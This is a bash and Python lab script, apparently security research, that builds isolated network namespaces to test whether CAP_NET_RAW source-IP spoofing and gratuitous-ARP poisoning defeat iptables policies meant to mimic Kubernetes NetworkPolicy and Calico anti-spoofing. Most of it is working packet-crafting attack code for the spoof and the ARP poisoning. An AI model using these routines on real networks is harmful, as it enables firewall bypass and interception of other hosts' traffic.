#!/bin/bash
# CAP_NET_RAW Source IP Spoofing vs iptables NetworkPolicy
#
# Three sub-tests:
#   A: No anti-spoofing (naive policy) — does raw socket spoof bypass iptables?
#   B: Calico-style interface-based anti-spoofing — does it catch the spoof?
#   C: ARP poisoning (same CAP_NET_RAW) — can MAC→IP mapping be corrupted?

set -uo pipefail
PATH="$PATH:/sbin:/usr/sbin"
RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'
ok()   { echo -e "${GREEN}[+]${NC} $*"; }
atk()  { echo -e "${RED}[ATK]${NC} $*"; }
inf()  { echo -e "${YELLOW}[INFO]${NC} $*"; }
section() { echo -e "\n${BOLD}$*${NC}"; echo "────────────────────────────────────────"; }

BR_IP="10.244.0.1"; ALLOWED_IP="10.244.0.10"; BLOCKED_IP="10.244.0.20"; TARGET_IP="10.244.0.30"
PORT=9877

cleanup() {
    pkill -f "python3.*9877" 2>/dev/null || true
    for ns in ns_a ns_b ns_t; do ip netns del "$ns" 2>/dev/null || true; done
    ip link set br0 down 2>/dev/null; ip link del br0 2>/dev/null || true
    iptables -F FORWARD 2>/dev/null || true
    rm -f /tmp/st_*
}
trap cleanup EXIT
cleanup 2>/dev/null || true

# ── Build topology ────────────────────────────────────────────────────────────
section "Setup"
ip link add br0 type bridge
ip addr add "$BR_IP/24" dev br0
ip link set br0 up
sysctl -w net.ipv4.ip_forward=1 -q

for args in "ns_a vh_a vp_a $ALLOWED_IP" "ns_b vh_b vp_b $BLOCKED_IP" "ns_t vh_t vp_t $TARGET_IP"; do
    read NS VH VP IP <<< "$args"
    ip netns add "$NS"
    ip link add "$VH" type veth peer name "$VP"
    ip link set "$VP" netns "$NS"
    ip link set "$VH" master br0; ip link set "$VH" up
    ip netns exec "$NS" ip link set lo up; ip netns exec "$NS" ip link set "$VP" up
    ip netns exec "$NS" ip addr add "$IP/24" dev "$VP"
    ip netns exec "$NS" ip route add default via "$BR_IP"
    ok "ns=$NS ip=$IP iface=$VP host_iface=$VH"
done

# Listener
ip netns exec ns_t python3 -c "
import socket
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',$PORT)); s.listen(10); s.settimeout(60)
open('/tmp/st_got','w').write('')
while True:
    try:
        c,a=s.accept()
        d=c.recv(256); c.send(b'HTTP/1.1 200 OK\r\n\r\nOK'); c.close()
        open('/tmp/st_got','a').write(a[0]+'\n')
    except: break
" &
sleep 0.3; ok "Listener on ns_t:$PORT"

# ── Reusable connect test ─────────────────────────────────────────────────────
test_connect() {
    local NS=$1 SRC_DESC=$2
    ip netns exec "$NS" python3 -c "
import socket; s=socket.socket(); s.settimeout(2)
try:
    s.connect(('$TARGET_IP',$PORT)); s.send(b'GET / HTTP/1.0\r\n\r\n')
    print(s.recv(256).decode()); s.close()
except: print('TIMEOUT')
" 2>/dev/null | grep -q "200 OK" && echo -e " ${RED}REACHED (BYPASS)${NC}" || echo -e " ${GREEN}BLOCKED${NC}"
}

# ── Spoof packet sender (raw socket, IP_HDRINCL) ─────────────────────────────
send_spoof() {
    local FROM_NS=$1 SPOOF_SRC=$2
    ip netns exec "$FROM_NS" python3 << PYEOF
import socket, struct

def ck(d):
    if len(d)%2: d+=b'\x00'
    s=sum(struct.unpack('!%dH'%(len(d)//2),d))
    s=(s>>16)+(s&0xffff); s+=(s>>16); return ~s&0xffff

SRC='$SPOOF_SRC'; DST='$TARGET_IP'; SP=55555; DP=$PORT
ip=struct.pack('!BBHHHBBH4s4s',0x45,0,40,7777,0,64,6,0,
    socket.inet_aton(SRC),socket.inet_aton(DST))
ip=ip[:10]+struct.pack('!H',ck(ip))+ip[12:]
tcp=struct.pack('!HHIIBBHHH',SP,DP,42,0,0x50,0x02,65535,0,0)
ph=struct.pack('!4s4sBBH',socket.inet_aton(SRC),socket.inet_aton(DST),0,6,len(tcp))
tcp=tcp[:16]+struct.pack('!H',ck(ph+tcp))+tcp[18:]
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
sent=s.sendto(ip+tcp,(DST,0)); s.close()
print(f'SENT {sent}B: src={SRC} -> dst={DST} [SYN, spoofed]')
PYEOF
}

check_target_received() {
    sleep 0.3
    if [ -s /tmp/st_got ]; then
        SRCS=$(sort -u /tmp/st_got | tr '\n' ' ')
        echo "  Target received connections from: $SRCS"
        grep -q "$BLOCKED_IP" /tmp/st_got && echo "BYPASS" || echo "BLOCKED"
    else
        echo "  No connections reached target"
        echo "BLOCKED"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# SUB-TEST A: Naive NetworkPolicy — no anti-spoofing
# (Correct rule order: ACCEPT for allowed-source, then DROP all)
# Question: does CAP_NET_RAW spoof bypass naive iptables?
# ═══════════════════════════════════════════════════════════════════════════════
section "SUB-TEST A: Naive NetworkPolicy (no anti-spoofing)"
inf "Simulates a CNI that relies ONLY on source-IP-based iptables rules"
inf "Rule order: ACCEPT allowed-source → target, then DROP all to target"

iptables -F FORWARD
iptables -A FORWARD -s "$ALLOWED_IP" -d "$TARGET_IP" -j ACCEPT   # legit traffic
iptables -A FORWARD -d "$TARGET_IP" -j DROP                       # default deny
iptables -A FORWARD -j ACCEPT                                     # allow everything else

inf "FORWARD rules:"
iptables -L FORWARD -n --line-numbers | sed 's/^/  /'
echo ""

echo -n "  A.1 allowed-source (normal TCP):"; test_connect ns_a "allowed"
echo -n "  A.2 blocked-source (normal TCP):"; test_connect ns_b "blocked"
echo ""

atk "A.3 blocked-source → SPOOF src=$ALLOWED_IP via raw socket (CAP_NET_RAW)"
send_spoof ns_b "$ALLOWED_IP"
sleep 0.5

echo -n "  A.3 did spoofed SYN reach target? "
if grep -q "$BLOCKED_IP\|$ALLOWED_IP" /tmp/st_got 2>/dev/null; then
    # If target shows ALLOWED_IP in connections, spoof worked and TCP completed
    echo -e "${RED}BYPASS via spoof? (check st_got)${NC}"
else
    echo -e "${YELLOW}SYN sent — TCP handshake incomplete (RST from target or iptables)${NC}"
fi
# Check if target received SYN via raw socket (use raw listener)
SYN_SEEN=$(ip netns exec ns_t timeout 1 python3 -c "
import socket, struct
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
s.settimeout(1)
results=[]
try:
    while True:
        d,a=s.recvfrom(4096)
        if len(d)>33 and a[0].startswith('10.244'):
            flags=d[33]; syn=(flags&0x02)!=0
            if syn: results.append(f'SYN from {a[0]}')
except: pass
for r in results: print(r)
" 2>/dev/null)

if [ -n "$SYN_SEEN" ]; then
    echo "  Raw capture at target: $SYN_SEEN"
    if echo "$SYN_SEEN" | grep -q "$ALLOWED_IP"; then
        echo -e "  ${RED}${BOLD}★ SPOOF WORKED — iptables saw src=$ALLOWED_IP, ACCEPT matched ★${NC}"
        echo -e "  ${RED}  CAP_NET_RAW + naive iptables policy = NetworkPolicy BYPASS${NC}"
        echo "BYPASS_A" > /tmp/st_result_a
    elif echo "$SYN_SEEN" | grep -q "$BLOCKED_IP"; then
        echo -e "  ${GREEN}Packet reached target with REAL src=$BLOCKED_IP (iptables blocked it before TCP)${NC}"
        echo "BLOCKED_A" > /tmp/st_result_a
    fi
else
    echo -e "  ${GREEN}No SYN reached target — iptables DROP caught the packet${NC}"
    inf "  (Even with correct rule order, kernel may have rewritten src IP back)"
    echo "BLOCKED_A" > /tmp/st_result_a
fi

# Clear state
> /tmp/st_got

# ═══════════════════════════════════════════════════════════════════════════════
# SUB-TEST B: Calico-style interface-based anti-spoofing
# Question: does interface-based anti-spoofing stop CAP_NET_RAW spoof?
# ═══════════════════════════════════════════════════════════════════════════════
section "SUB-TEST B: With interface-based anti-spoofing (Calico cali-from-ep style)"
inf "Simulates Calico's anti-spoofing: packets on vh_b MUST have src=$BLOCKED_IP"

iptables -F FORWARD

# Anti-spoofing: if packet comes in on blocked-source's veth BUT src is NOT blocked-source → DROP
iptables -A FORWARD -i vh_b '!' -s "$BLOCKED_IP" -j DROP    # anti-spoof for ns_blocked
iptables -A FORWARD -i vh_a '!' -s "$ALLOWED_IP" -j DROP    # anti-spoof for ns_allowed

# NetworkPolicy
iptables -A FORWARD -s "$ALLOWED_IP" -d "$TARGET_IP" -j ACCEPT
iptables -A FORWARD -d "$TARGET_IP" -j DROP
iptables -A FORWARD -j ACCEPT

inf "FORWARD rules (with anti-spoofing):"
iptables -L FORWARD -n --line-numbers | sed 's/^/  /'
echo ""

echo -n "  B.1 allowed-source (normal TCP):"; test_connect ns_a "allowed"
echo -n "  B.2 blocked-source (normal TCP):"; test_connect ns_b "blocked"
echo ""

atk "B.3 blocked-source → SPOOF src=$ALLOWED_IP (same CAP_NET_RAW attack)"
send_spoof ns_b "$ALLOWED_IP"
sleep 0.5

SYN_SEEN_B=$(ip netns exec ns_t timeout 1 python3 -c "
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
s.settimeout(1)
results=[]
try:
    while True:
        d,a=s.recvfrom(4096)
        if len(d)>33 and a[0].startswith('10.244'):
            flags=d[33]
            if flags&0x02: results.append(f'SYN from {a[0]}')
except: pass
for r in results: print(r)
" 2>/dev/null)

echo -n "  B.3 spoofed SYN reached target? "
if echo "$SYN_SEEN_B" | grep -q "$ALLOWED_IP"; then
    echo -e "${RED}${BOLD}★ ANTI-SPOOFING BYPASSED ★${NC}"
    echo "BYPASS_B" > /tmp/st_result_b
elif [ -n "$SYN_SEEN_B" ]; then
    echo -e "${YELLOW}Packet seen with src: $(echo "$SYN_SEEN_B"|head -1)${NC}"
    echo "PARTIAL_B" > /tmp/st_result_b
else
    echo -e "${GREEN}NO — anti-spoofing caught the spoofed packet ✓${NC}"
    echo "BLOCKED_B" > /tmp/st_result_b
fi

> /tmp/st_got

# ═══════════════════════════════════════════════════════════════════════════════
# SUB-TEST C: ARP poisoning (CAP_NET_RAW allows AF_PACKET)
# Can blocked-source poison ARP to associate its MAC with allowed-source's IP?
# ═══════════════════════════════════════════════════════════════════════════════
section "SUB-TEST C: ARP Poisoning via CAP_NET_RAW (AF_PACKET)"
atk "Sending gratuitous ARP: claim $ALLOWED_IP belongs to blocked-source's MAC"
inf "If bridge ARP table is poisoned, L2 traffic to $ALLOWED_IP goes to blocked-source"
echo ""

# Get blocked-source's MAC
BLOCKED_MAC=$(ip netns exec ns_b ip link show vp_b | grep ether | awk '{print $2}')
ALLOWED_MAC=$(ip netns exec ns_a ip link show vp_a | grep ether | awk '{print $2}')
inf "blocked-source MAC: $BLOCKED_MAC"
inf "allowed-source MAC: $ALLOWED_MAC"

# Send gratuitous ARP from blocked-source claiming allowed-source's IP
ip netns exec ns_b python3 << PYEOF
import socket, struct

def mac_bytes(m):
    return bytes(int(x,16) for x in m.split(':'))

BLOCKED_MAC = '$BLOCKED_MAC'
ALLOWED_IP  = '$ALLOWED_IP'
BROADCAST   = 'ff:ff:ff:ff:ff:ff'

# ARP packet: gratuitous ARP reply claiming ALLOWED_IP belongs to BLOCKED_MAC
eth = mac_bytes(BROADCAST) + mac_bytes(BLOCKED_MAC) + b'\x08\x06'
arp = struct.pack('!HHBBH',
    1,        # hardware type: Ethernet
    0x0800,   # protocol type: IPv4
    6,        # hardware size
    4,        # protocol size
    2         # opcode: reply (gratuitous)
)
arp += mac_bytes(BLOCKED_MAC)   # sender MAC (blocked-source's real MAC)
arp += socket.inet_aton(ALLOWED_IP)  # sender IP (LYING: claiming allowed-source's IP)
arp += mac_bytes(BROADCAST)     # target MAC
arp += socket.inet_aton(ALLOWED_IP)  # target IP

frame = eth + arp

# Send via AF_PACKET (requires CAP_NET_RAW)
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind(('vp_b', 0))
    for _ in range(5):  # send 5x for reliability
        s.send(frame)
    s.close()
    print(f'SENT gratuitous ARP: {ALLOWED_IP} -> {BLOCKED_MAC} (x5)')
except PermissionError as e:
    print(f'EPERM: {e}')
except Exception as e:
    print(f'ERROR: {e}')
PYEOF

sleep 0.5

# Check if the ARP tables were poisoned
inf "ARP table in ns_allowed after gratuitous ARP:"
ip netns exec ns_a arp -n 2>/dev/null | sed 's/^/  /' || echo "  (empty)"

inf "ARP table in ns_target after gratuitous ARP:"
ip netns exec ns_t arp -n 2>/dev/null | sed 's/^/  /' || echo "  (empty)"

inf "Bridge MAC table:"
bridge fdb show br br0 2>/dev/null | grep -v permanent | sed 's/^/  /' | head -20 || echo "  (bridge fdb not available)"

# Ping from target to allowed-source — where does it actually go?
inf "target pings $ALLOWED_IP — check if traffic goes to blocked-source's MAC..."
ip netns exec ns_t ping -c 2 -W 1 "$ALLOWED_IP" -q 2>/dev/null

# Check if traffic to ALLOWED_IP arrived at ns_b (blocked-source) after ARP poisoning
ARP_RESULT=$(ip netns exec ns_b timeout 2 python3 -c "
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
s.settimeout(2)
try:
    d,a=s.recvfrom(1024)
    print(f'RECEIVED traffic from {a[0]} (ICMP intercepted)')
except: print('No intercepted traffic')
" 2>/dev/null)
echo "  ARP intercept result: $ARP_RESULT"

if echo "$ARP_RESULT" | grep -q "RECEIVED"; then
    echo -e "  ${RED}${BOLD}★ ARP POISONING WORKED — traffic to $ALLOWED_IP diverted to ns_blocked ★${NC}"
    echo "BYPASS_C" > /tmp/st_result_c
else
    echo -e "  ${GREEN}ARP poisoning not effective in this topology${NC}"
    echo "BLOCKED_C" > /tmp/st_result_c
fi

# ═══════════════════════════════════════════════════════════════════════════════
section "FINAL RESULTS"
echo ""
A=$(cat /tmp/st_result_a 2>/dev/null || echo "?")
B=$(cat /tmp/st_result_b 2>/dev/null || echo "?")
C=$(cat /tmp/st_result_c 2>/dev/null || echo "?")

printf "  %-60s %s\n" "A: CAP_NET_RAW IP spoof vs naive iptables (no anti-spoof):" "$A"
printf "  %-60s %s\n" "B: CAP_NET_RAW IP spoof vs interface anti-spoofing (Calico):" "$B"
printf "  %-60s %s\n" "C: CAP_NET_RAW ARP poisoning (AF_PACKET):" "$C"
echo ""

[ "$A" = "BYPASS_A" ] && echo -e "${RED}★ A: Naive iptables NetworkPolicy bypassable with CAP_NET_RAW (default cap)${NC}"
[ "$B" = "BYPASS_B" ] && echo -e "${RED}★ B: Calico anti-spoofing bypassable! Real CVE candidate${NC}"
[ "$B" = "BLOCKED_B" ] && echo -e "${GREEN}B: Calico interface anti-spoofing is effective against raw socket spoof${NC}"
[ "$C" = "BYPASS_C" ] && echo -e "${RED}★ C: ARP poisoning works — MAC table corrupted, traffic diverted${NC}"
